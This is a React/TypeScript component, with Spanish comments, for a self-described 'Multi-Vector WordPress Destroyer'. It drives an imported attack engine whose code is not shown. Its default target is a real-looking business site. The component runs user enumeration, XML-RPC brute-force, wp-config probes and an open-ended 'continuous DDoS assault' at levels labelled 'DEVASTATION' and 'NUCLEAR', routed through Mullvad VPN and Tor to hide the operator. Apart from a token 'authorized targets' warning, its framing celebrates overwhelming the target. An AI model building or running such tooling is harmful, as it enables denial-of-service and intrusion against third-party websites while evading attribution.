import React, { useState, useEffect, useRef } from 'react';
import FloatingWindow from './FloatingWindow';
import { RealAttackEngine, AttackResult, AttackConfig as EngineConfig } from '../utils/realAttacks';
import { TargetHealthMonitor } from './TargetHealthMonitor';
import { torMullvadManager, TorStatus, MullvadStatus } from '../utils/torMullvadManager';

interface RustAttackWindowProps {
  isOpen: boolean;
  onClose: () => void;
  position: { x: number; y: number };
  onPositionChange: (position: { x: number; y: number }) => void;
}

interface AttackConfig {
  target: string;
  attackLevel: 'RECONNAISSANCE' | 'MODERATE' | 'AGGRESSIVE' | 'DEVASTATION' | 'NUCLEAR';
  concurrency: number;
  timeout: number;
  stealthMode: boolean;
  enabledAttacks: {
    xmlrpcBruteforce: boolean;
    xmlrpcMulticall: boolean;
    xmlrpcPingback: boolean;
    wpCronDos: boolean;
    wpConfigExploit: boolean;
    directoryTraversal: boolean;
    backupFileHunting: boolean;
    pluginEnumeration: boolean;
    userEnumeration: boolean;
    sqlInjection: boolean;
    xssPayloads: boolean;
    fileUploadBypass: boolean;
  };
  customPayloads: string[];
  proxyChain: boolean;
  userAgentRotation: boolean;
  rateLimiting: number;
}

interface AttackStats {
  totalRequests: number;
  successfulRequests: number;
  failedRequests: number;
  blockedRequests: number;
  vulnerabilitiesFound: number;
  credentialsFound: number;
  filesExposed: number;
  requestsPerSecond: number;
  uptime: number;
  currentPhase: string;
  threatsNeutralized: number;
}

interface VulnerabilityFound {
  type: string;
  endpoint: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  evidence: string;
  timestamp: string;
}

export const RustAttackWindow: React.FC<RustAttackWindowProps> = ({
  isOpen,
  onClose,
  position,
  onPositionChange,
}) => {
  const [config, setConfig] = useState<AttackConfig>({
    target: 'https://bonanovadetectives.com',
    attackLevel: 'RECONNAISSANCE',
    concurrency: 10,
    timeout: 30,
    stealthMode: true,
    enabledAttacks: {
      xmlrpcBruteforce: true,
      xmlrpcMulticall: true,
      xmlrpcPingback: true,
      wpCronDos: false,
      wpConfigExploit: true,
      directoryTraversal: true,
      backupFileHunting: true,
      pluginEnumeration: true,
      userEnumeration: true,
      sqlInjection: false,
      xssPayloads: false,
      fileUploadBypass: false,
    },
    customPayloads: [],
    proxyChain: false,
    userAgentRotation: true,
    rateLimiting: 100,
  });
  
  const [isRunning, setIsRunning] = useState(false);
  const [currentTab, setCurrentTab] = useState<'config' | 'output' | 'vulns' | 'stats'>('config');
  const [output, setOutput] = useState<string[]>([
    '╔══════════════════════════════════════════════════════════════════════╗',
    '║                    RUST ATTACK FRAMEWORK v3.0                       ║',
    '║                  Multi-Vector WordPress Destroyer                   ║',
    '║                        REAL IMPLEMENTATION                          ║',
    '╚══════════════════════════════════════════════════════════════════════╝',
    '',
    '🎯 Real WordPress Penetration Testing Framework Ready',
    '⚠️  WARNING: Real attacks - Use only on authorized targets!',
    '🔥 Multi-endpoint assault capabilities loaded',
    '💀 Target neutralization protocols active',
    '',
  ]);
  
  const [stats, setStats] = useState<AttackStats>({
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    blockedRequests: 0,
    vulnerabilitiesFound: 0,
    credentialsFound: 0,
    filesExposed: 0,
    requestsPerSecond: 0,
    uptime: 0,
    currentPhase: 'STANDBY',
    threatsNeutralized: 0,
  });

  const [vulnerabilities, setVulnerabilities] = useState<VulnerabilityFound[]>([]);
  const [attackEngine, setAttackEngine] = useState<RealAttackEngine | null>(null);
  
  const outputRef = useRef<HTMLDivElement>(null);
  const startTimeRef = useRef<number>(0);

  const [isHealthMonitorOpen, setIsHealthMonitorOpen] = useState(false);

  // Estados para Tor y Mullvad
  const [torStatus, setTorStatus] = useState<TorStatus>({ isRunning: false });
  const [mullvadStatus, setMullvadStatus] = useState<MullvadStatus>({ isConnected: false });
  const [tunnelLoading, setTunnelLoading] = useState(false);
  const [availableLocations, setAvailableLocations] = useState<string[]>([]);

  const attackEngineRef = useRef<RealAttackEngine | null>(null);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  useEffect(() => {
    // Verificar estado inicial de túneles
    checkTunnelStatus();
    loadMullvadLocations();
  }, []);

  const checkTunnelStatus = async () => {
    try {
      const status = await torMullvadManager.getFullStatus();
      setTorStatus(status.tor);
      setMullvadStatus(status.mullvad);
    } catch (error) {
      console.error('Error verificando estado de túneles:', error);
    }
  };

  const loadMullvadLocations = async () => {
    try {
      const locations = await torMullvadManager.getMullvadLocations();
      setAvailableLocations(locations);
    } catch (error) {
      console.error('Error cargando ubicaciones Mullvad:', error);
    }
  };

  const handleStartTorTunnel = async () => {
    setTunnelLoading(true);
    try {
      const status = await torMullvadManager.startTorTunnel();
      setTorStatus(status);
      
      if (status.isRunning && status.onionAddress) {
        addOutput(`🧅 Túnel Tor iniciado: ${status.onionAddress}`);
      } else if (status.error) {
        addOutput(`❌ Error Tor: ${status.error}`);
      }
    } catch (error) {
      console.error('Error iniciando Tor:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const handleStopTorTunnel = async () => {
    setTunnelLoading(true);
    try {
      const success = await torMullvadManager.stopTorTunnel();
      if (success) {
        setTorStatus({ isRunning: false });
        addOutput('🛑 Túnel Tor detenido');
      }
    } catch (error) {
      console.error('Error deteniendo Tor:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const handleConnectMullvad = async () => {
    setTunnelLoading(true);
    try {
      const status = await torMullvadManager.connectMullvad();
      setMullvadStatus(status);
      
      if (status.isConnected) {
        addOutput(`🔒 Mullvad VPN conectado: ${status.location} (${status.ipAddress})`);
      } else if (status.error) {
        addOutput(`❌ Error Mullvad: ${status.error}`);
      }
    } catch (error) {
      console.error('Error conectando Mullvad:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const handleDisconnectMullvad = async () => {
    setTunnelLoading(true);
    try {
      const success = await torMullvadManager.disconnectMullvad();
      if (success) {
        setMullvadStatus({ isConnected: false });
        addOutput('🔓 Mullvad VPN desconectado');
      }
    } catch (error) {
      console.error('Error desconectando Mullvad:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const handleStartFullTunnel = async () => {
    setTunnelLoading(true);
    try {
      const status = await torMullvadManager.startFullTunnel();
      setTorStatus(status.tor);
      setMullvadStatus(status.mullvad);
      
      if (status.tor.isRunning && status.mullvad.isConnected) {
        addOutput(`🎉 Túnel completo establecido! VPN: ${status.mullvad.location} | Onion: ${status.tor.onionAddress}`);
      }
    } catch (error) {
      console.error('Error iniciando túnel completo:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const handleStopFullTunnel = async () => {
    setTunnelLoading(true);
    try {
      const success = await torMullvadManager.stopFullTunnel();
      if (success) {
        setTorStatus({ isRunning: false });
        setMullvadStatus({ isConnected: false });
        addOutput('🛑 Túnel completo detenido');
      }
    } catch (error) {
      console.error('Error deteniendo túnel completo:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const handleChangeMullvadLocation = async (location: string) => {
    setTunnelLoading(true);
    try {
      const countryCode = location.split(' - ')[0];
      const success = await torMullvadManager.changeMullvadLocation(countryCode);
      if (success) {
        // Actualizar estado después del cambio
        setTimeout(async () => {
          const status = await torMullvadManager.getMullvadStatus();
          setMullvadStatus(status);
        }, 3000);
      }
    } catch (error) {
      console.error('Error cambiando ubicación:', error);
    } finally {
      setTunnelLoading(false);
    }
  };

  const addOutput = (line: string) => {
    setOutput(prev => [...prev, line]);
  };

  const addVulnerability = (vuln: VulnerabilityFound) => {
    setVulnerabilities(prev => [...prev, vuln]);
    setStats(prev => ({ ...prev, vulnerabilitiesFound: prev.vulnerabilitiesFound + 1 }));
  };

  const updateStats = (result: AttackResult) => {
    setStats(prev => {
      const newStats = { ...prev };
      newStats.totalRequests++;
      
      if (result.success) {
        newStats.successfulRequests++;
      } else if (result.statusCode === 403 || result.statusCode === 429) {
        newStats.blockedRequests++;
      } else {
        newStats.failedRequests++;
      }
      
      const elapsed = (Date.now() - startTimeRef.current) / 1000;
      newStats.requestsPerSecond = Math.floor(newStats.totalRequests / elapsed);
      newStats.uptime = Math.floor(elapsed);
      
      return newStats;
    });
  };

  const getAttackLevelConfig = (level: string) => {
    switch (level) {
      case 'RECONNAISSANCE':
        return {
          concurrency: 5,
          rateLimiting: 50,
          description: 'Passive information gathering and vulnerability scanning',
          color: '#00ff00',
          intensity: 1
        };
      case 'MODERATE':
        return {
          concurrency: 25,
          rateLimiting: 150,
          description: 'Active probing with moderate resource consumption',
          color: '#ffff00',
          intensity: 2
        };
      case 'AGGRESSIVE':
        return {
          concurrency: 100,
          rateLimiting: 500,
          description: 'High-intensity multi-vector assault',
          color: '#ff8800',
          intensity: 3
        };
      case 'DEVASTATION':
        return {
          concurrency: 500,
          rateLimiting: 2000,
          description: 'Maximum destructive capability - Server overload imminent',
          color: '#ff4444',
          intensity: 4
        };
      case 'NUCLEAR':
        return {
          concurrency: 2000,
          rateLimiting: 10000,
          description: '🚨 EXTREME DANGER - Complete infrastructure annihilation',
          color: '#ff0000',
          intensity: 5
        };
      default:
        return {
          concurrency: 10,
          rateLimiting: 100,
          description: 'Standard configuration',
          color: '#00ff00',
          intensity: 1
        };
    }
  };

  const startAttack = async () => {
    if (isRunning) return;
    
    setIsRunning(true);
    startTimeRef.current = Date.now();
    setCurrentTab('output');
    
    // Open health monitor automatically
    setIsHealthMonitorOpen(true);
    
    const levelConfig = getAttackLevelConfig(config.attackLevel);
    
    addOutput(`🎯 TARGET ACQUIRED: ${config.target}`);
    addOutput(`💥 ATTACK LEVEL: ${config.attackLevel} (Intensity: ${levelConfig.intensity}/5)`);
    addOutput(`⚡ CONCURRENCY: ${levelConfig.concurrency} threads`);
    addOutput(`🔄 RATE LIMIT: ${levelConfig.rateLimiting} req/min`);
    addOutput(`🥷 STEALTH MODE: ${config.stealthMode ? 'ENABLED' : 'DISABLED'}`);
    addOutput('');
    addOutput('🚀 INITIALIZING REAL ATTACK SEQUENCE...');
    addOutput('📊 Health monitor window opened - Monitor target destruction in real-time');
    addOutput('');

    // Initialize real attack engine
    const engineConfig: EngineConfig = {
      target: config.target,
      timeout: config.timeout,
      userAgent: config.userAgentRotation ? 
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' : 
        'RustAttackFramework/3.0',
      stealthMode: config.stealthMode,
      concurrency: levelConfig.concurrency,
      rateLimiting: levelConfig.rateLimiting,
    };

    const engine = new RealAttackEngine(engineConfig);
    setAttackEngine(engine);

    try {
      await executeRealAttack(engine);
    } catch (error) {
      addOutput(`❌ CRITICAL ERROR: ${error}`);
      setIsRunning(false);
      setIsHealthMonitorOpen(false);
    }
  };

  const executeRealAttack = async (engine: RealAttackEngine) => {
    setStats(prev => ({ ...prev, currentPhase: 'RECONNAISSANCE' }));
    addOutput('🔍 Phase 1: RECONNAISSANCE - Gathering target intelligence...');
    
    // Initial reconnaissance
    if (config.enabledAttacks.userEnumeration) {
      addOutput('🎯 Testing user enumeration endpoint...');
      const result = await engine.testUserEnumeration();
      updateStats(result);
      
      if (result.vulnerability) {
        addVulnerability({
          type: result.vulnerability.type,
          endpoint: `${config.target}/wp-json/wp/v2/users`,
          severity: result.vulnerability.severity,
          evidence: result.vulnerability.evidence,
          timestamp: new Date().toISOString()
        });
        addOutput(`🚨 VULNERABILITY FOUND: ${result.vulnerability.type}`);
      }
      addOutput(`   └─ Status: ${result.statusCode} | Time: ${result.responseTime}ms`);
    }

    if (config.enabledAttacks.xmlrpcBruteforce) {
      addOutput('🔓 Testing XML-RPC endpoint...');
      const result = await engine.testXMLRPC();
      updateStats(result);
      
      if (result.vulnerability) {
        addVulnerability({
          type: result.vulnerability.type,
          endpoint: `${config.target}/xmlrpc.php`,
          severity: result.vulnerability.severity,
          evidence: result.vulnerability.evidence,
          timestamp: new Date().toISOString()
        });
        addOutput(`🚨 VULNERABILITY FOUND: ${result.vulnerability.type}`);
      }
      addOutput(`   └─ Status: ${result.statusCode} | Time: ${result.responseTime}ms`);
    }

    if (config.enabledAttacks.wpConfigExploit) {
      addOutput('🔧 Testing wp-config.php exposure...');
      const result = await engine.testWPConfig();
      updateStats(result);
      
      if (result.vulnerability) {
        addVulnerability({
          type: result.vulnerability.type,
          endpoint: result.vulnerability.evidence.includes('wp-config.php') ? `${config.target}/wp-config.php` : config.target,
          severity: result.vulnerability.severity,
          evidence: result.vulnerability.evidence,
          timestamp: new Date().toISOString()
        });
        addOutput(`🚨 CRITICAL VULNERABILITY: ${result.vulnerability.type}`);
      }
      addOutput(`   └─ Status: ${result.statusCode} | Time: ${result.responseTime}ms`);
    }

    addOutput('');
    setStats(prev => ({ ...prev, currentPhase: 'CONTINUOUS_DDOS_ATTACK' }));
    addOutput('💥 Phase 2: LAUNCHING CONTINUOUS DDoS ASSAULT...');
    addOutput('⚡ Starting multi-vector continuous attack streams...');
    addOutput('🔥 XML-RPC DDoS: ACTIVE');
    addOutput('💣 wp-cron DDoS: ACTIVE');
    addOutput('🗂️  Directory traversal flood: ACTIVE');
    addOutput('📋 Backup file hunting: ACTIVE');
    addOutput('');
    addOutput('🚨 WARNING: Continuous attack mode - Target will be overwhelmed!');
    addOutput('');

    // Start continuous DDoS attacks
    engine.startContinuousAttack((result: AttackResult) => {
      updateStats(result);
      
      // Log successful attacks
      if (result.success) {
        const emoji = result.statusCode === 200 ? '✅' : result.statusCode === 500 ? '💥' : '⚡';
        addOutput(`${emoji} ${result.statusCode} | ${result.responseTime}ms | ${result.vulnerability ? 'VULN FOUND' : 'OK'}`);
      } else if (result.statusCode === 429) {
        addOutput(`⏰ Rate limited - Target is struggling! | ${result.responseTime}ms`);
      } else if (result.statusCode >= 500) {
        addOutput(`💥 Server error ${result.statusCode} - Target is breaking! | ${result.responseTime}ms`);
      } else if (result.error) {
        addOutput(`❌ ${result.error}`);
      }
      
      // Handle vulnerabilities found during continuous attack
      if (result.vulnerability) {
        addVulnerability({
          type: result.vulnerability.type,
          endpoint: config.target,
          severity: result.vulnerability.severity,
          evidence: result.vulnerability.evidence,
          timestamp: new Date().toISOString()
        });
        addOutput(`🚨 NEW VULNERABILITY: ${result.vulnerability.type} (${result.vulnerability.severity})`);
      }
    });

    addOutput('🎯 Continuous DDoS attack initiated - Will run until manually stopped');
    addOutput('📊 Monitor statistics tab for real-time damage assessment');
  };

  const stopAttack = () => {
    setIsRunning(false);
    setIsHealthMonitorOpen(false); // Close health monitor
    if (attackEngine) {
      attackEngine.abort();
    }
    setStats(prev => ({ ...prev, currentPhase: 'TERMINATED' }));
    addOutput('');
    addOutput('🛑 ATTACK SEQUENCE TERMINATED BY OPERATOR');
    addOutput('📊 Health monitor closed - Attack assessment complete');
    addOutput('📊 Generating comprehensive damage assessment...');
    addOutput(`💀 FINAL STATISTICS: ${stats.vulnerabilitiesFound} vulnerabilities, ${stats.filesExposed} files exposed`);
    addOutput('');
  };

  const clearOutput = () => {
    setIsHealthMonitorOpen(false); // Close health monitor
    setOutput([
      '╔══════════════════════════════════════════════════════════════════════╗',
      '║                    RUST ATTACK FRAMEWORK v3.0                       ║',
      '║                  Multi-Vector WordPress Destroyer                   ║',
      '║                        REAL IMPLEMENTATION                          ║',
      '╚══════════════════════════════════════════════════════════════════════╝',
      '',
      '🎯 Real WordPress Penetration Testing Framework Ready',
      '⚠️  WARNING: Real attacks - Use only on authorized targets!',
      '🔥 Multi-endpoint assault capabilities loaded',
      '💀 Target neutralization protocols active',
      '',
    ]);
    setStats({
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      blockedRequests: 0,
      vulnerabilitiesFound: 0,
      credentialsFound: 0,
      filesExposed: 0,
      requestsPerSecond: 0,
      uptime: 0,
      currentPhase: 'STANDBY',
      threatsNeutralized: 0,
    });
    setVulnerabilities([]);
  };

  const updateAttackLevel = (level: AttackConfig['attackLevel']) => {
    const levelConfig = getAttackLevelConfig(level);
    setConfig(prev => ({
      ...prev,
      attackLevel: level,
      concurrency: levelConfig.concurrency,
      rateLimiting: levelConfig.rateLimiting
    }));
  };

  // Close health monitor when main window closes
  useEffect(() => {
    if (!isOpen) {
      setIsHealthMonitorOpen(false);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const levelConfig = getAttackLevelConfig(config.attackLevel);

  return (
    <div className="rust-attack-window">
      <div className="window-header">
        <span className="window-title">🦀 Rust Attack Tool v2.0 - Advanced Penetration Testing</span>
        <button className="close-button" onClick={onClose}>×</button>
      </div>

      <div className="window-content">
        {/* Sección de Túneles de Anonimato - Solo Estado */}
        <div className="tunnel-section">
          <h3>🔒 Estado de Túneles de Anonimato</h3>
          
          {/* Estado actual */}
          <div className="tunnel-status">
            <div className={`status-indicator ${torStatus.isRunning ? 'active' : 'inactive'}`}>
              🧅 Tor: {torStatus.isRunning ? 'ACTIVO' : 'INACTIVO'}
              {torStatus.onionAddress && <span className="onion-address"> - {torStatus.onionAddress}</span>}
            </div>
            <div className={`status-indicator ${mullvadStatus.isConnected ? 'active' : 'inactive'}`}>
              🔒 Mullvad: {mullvadStatus.isConnected ? 'CONECTADO' : 'DESCONECTADO'}
              {mullvadStatus.location && <span className="vpn-location"> - {mullvadStatus.location}</span>}
            </div>
          </div>

          {/* Información adicional */}
          <div className="tunnel-info">
            <div className="info-note">
              💡 <strong>Nota:</strong> Usa las aplicaciones dedicadas "Tor Manager" y "Mullvad Manager" 
              del escritorio para controlar los túneles de anonimato.
            </div>
            
            {(torStatus.isRunning || mullvadStatus.isConnected) && (
              <div className="security-status">
                <div className="security-level">
                  🛡️ <strong>Nivel de Anonimato:</strong> 
                  {torStatus.isRunning && mullvadStatus.isConnected ? ' MÁXIMO (VPN + Tor)' :
                   torStatus.isRunning ? ' ALTO (Solo Tor)' :
                   mullvadStatus.isConnected ? ' MEDIO (Solo VPN)' : ' NINGUNO'}
                </div>
                
                {torStatus.isRunning && mullvadStatus.isConnected && (
                  <div className="tunnel-chain">
                    🔗 <strong>Cadena de Túneles:</strong> Tu IP → Mullvad VPN → Red Tor → Target
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Botón de actualización */}
          <div className="tunnel-refresh">
            <button 
              onClick={checkTunnelStatus}
              disabled={tunnelLoading}
              className="refresh-btn"
            >
              {tunnelLoading ? '⏳' : '🔄'} Actualizar Estado
            </button>
          </div>
        </div>

        {/* Separador */}
        <div className="section-separator"></div>

        {/* Sección de Ataques */}
        <div className="attack-section">
          <h3>⚔️ Configuración de Ataque</h3>
          
          <div className="input-group">
            <label>🎯 Target URL:</label>
            <input
              type="text"
              value={config.target}
              onChange={(e) => setConfig(prev => ({ ...prev, target: e.target.value }))}
              placeholder="https://target-website.com"
              className="target-input"
            />
          </div>

          <div className="input-group">
            <label>💥 Attack Level:</label>
            <select 
              value={config.attackLevel} 
              onChange={(e) => updateAttackLevel(e.target.value as AttackConfig['attackLevel'])}
              className="level-select"
            >
              <option value="RECONNAISSANCE">🔍 RECONNAISSANCE - Passive scanning</option>
              <option value="MODERATE">⚡ MODERATE - Active probing</option>
              <option value="AGGRESSIVE">🔥 AGGRESSIVE - Intensive attacks</option>
              <option value="DEVASTATION">💀 DEVASTATION - Maximum impact</option>
              <option value="NUCLEAR">☢️ NUCLEAR - Total annihilation</option>
            </select>
          </div>

          <div className="attack-controls">
            <button 
              onClick={startAttack}
              disabled={!config.target || isRunning}
              className={`attack-btn ${isRunning ? 'attacking' : ''}`}
            >
              {isRunning ? '🔥 ATTACKING...' : '⚔️ START ATTACK'}
            </button>
            
            <button 
              onClick={stopAttack}
              disabled={!isRunning}
              className="stop-btn"
            >
              🛑 STOP ATTACK
            </button>

            <button 
              onClick={clearOutput}
              className="clear-btn"
            >
              🗑️ CLEAR RESULTS
            </button>
          </div>
        </div>

        {/* Resultados */}
        <div className="results-section">
          <h3>📊 Attack Results</h3>
          <div className="output-terminal">
            {output.map((line, index) => (
              <div key={index} className="output-line">
                {line}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Health Monitor */}
      {isHealthMonitorOpen && (
        <TargetHealthMonitor
          isOpen={isHealthMonitorOpen}
          targetUrl={config.target}
          attackStats={{
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            blockedRequests: 0,
            requestsPerSecond: 0,
            uptime: 0,
            currentPhase: 'IDLE'
          }}
          onClose={() => setIsHealthMonitorOpen(false)}
        />
      )}

      <style>{`
        .tunnel-section {
          background: #f0f0f0;
          border: 2px inset #c0c0c0;
          padding: 10px;
          margin-bottom: 15px;
        }

        .tunnel-status {
          display: flex;
          gap: 20px;
          margin-bottom: 15px;
          padding: 8px;
          background: #000;
          color: #00ff00;
          font-family: 'Courier New', monospace;
          border: 1px inset #c0c0c0;
        }

        .status-indicator {
          font-weight: bold;
        }

        .status-indicator.active {
          color: #00ff00;
        }

        .status-indicator.inactive {
          color: #ff6666;
        }

        .onion-address, .vpn-location {
          font-size: 0.9em;
          color: #ffff00;
        }

        .tunnel-info {
          margin-bottom: 10px;
        }

        .info-note {
          margin-bottom: 5px;
        }

        .security-status {
          margin-top: 5px;
        }

        .security-level {
          margin-bottom: 5px;
        }

        .tunnel-chain {
          margin-top: 5px;
        }

        .tunnel-refresh {
          margin-top: 10px;
        }

        .refresh-btn {
          padding: 6px 12px;
          border: 2px outset #c0c0c0;
          background: #c0c0c0;
          color: #000;
          font-family: 'MS Sans Serif', sans-serif;
          font-size: 11px;
          cursor: pointer;
          min-width: 100px;
        }

        .refresh-btn:hover:not(:disabled) {
          background: #d0d0d0;
        }

        .refresh-btn:active {
          border: 2px inset #c0c0c0;
        }

        .refresh-btn:disabled {
          background: #a0a0a0;
          color: #666;
          cursor: not-allowed;
        }

        .section-separator {
          height: 2px;
          background: #808080;
          margin: 15px 0;
          border-top: 1px solid #404040;
          border-bottom: 1px solid #ffffff;
        }

        .attack-section h3 {
          color: #800000;
          margin-bottom: 15px;
        }

        /* Estilos existentes */
        .rust-attack-window {
          position: fixed;
          top: 50px;
          left: 50px;
          width: 900px;
          height: 700px;
          background: #c0c0c0;
          border: 2px outset #c0c0c0;
          font-family: 'MS Sans Serif', sans-serif;
          font-size: 11px;
          z-index: 1000;
          display: flex;
          flex-direction: column;
        }

        .window-header {
          background: linear-gradient(90deg, #0000ff 0%, #000080 100%);
          color: white;
          padding: 2px 4px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          font-weight: bold;
          border-bottom: 1px solid #000;
        }

        .window-title {
          font-size: 11px;
        }

        .close-button {
          background: #c0c0c0;
          border: 1px outset #c0c0c0;
          width: 16px;
          height: 14px;
          font-size: 10px;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .close-button:hover {
          background: #ff0000;
          color: white;
        }

        .window-content {
          flex: 1;
          padding: 10px;
          overflow-y: auto;
          background: #c0c0c0;
        }

        .input-group {
          margin-bottom: 10px;
        }

        .input-group label {
          display: block;
          margin-bottom: 4px;
          font-weight: bold;
          color: #000080;
        }

        .target-input, .level-select {
          width: 100%;
          padding: 4px;
          border: 2px inset #c0c0c0;
          background: white;
          font-family: 'MS Sans Serif', sans-serif;
          font-size: 11px;
        }

        .attack-controls {
          display: flex;
          gap: 10px;
          margin: 15px 0;
        }

        .attack-btn, .stop-btn, .clear-btn {
          padding: 8px 16px;
          border: 2px outset #c0c0c0;
          background: #c0c0c0;
          color: #000;
          font-family: 'MS Sans Serif', sans-serif;
          font-size: 11px;
          cursor: pointer;
          font-weight: bold;
        }

        .attack-btn {
          background: #ff6b6b;
          color: white;
        }

        .attack-btn.attacking {
          background: #ff0000;
          animation: blink 1s infinite;
        }

        .stop-btn {
          background: #ffa500;
        }

        .clear-btn {
          background: #87ceeb;
        }

        .attack-btn:hover:not(:disabled), .stop-btn:hover:not(:disabled), .clear-btn:hover {
          filter: brightness(1.1);
        }

        .attack-btn:disabled {
          background: #a0a0a0;
          color: #666;
          cursor: not-allowed;
        }

        .results-section {
          margin-top: 15px;
        }

        .results-section h3 {
          color: #000080;
          margin-bottom: 10px;
        }

        .output-terminal {
          background: #000;
          color: #00ff00;
          font-family: 'Courier New', monospace;
          font-size: 12px;
          padding: 10px;
          height: 200px;
          overflow-y: auto;
          border: 2px inset #c0c0c0;
        }

        .output-line {
          margin-bottom: 2px;
          word-wrap: break-word;
        }

        @keyframes blink {
          0%, 50% { opacity: 1; }
          51%, 100% { opacity: 0.5; }
        }
      `}</style>
    </div>
  );
}; 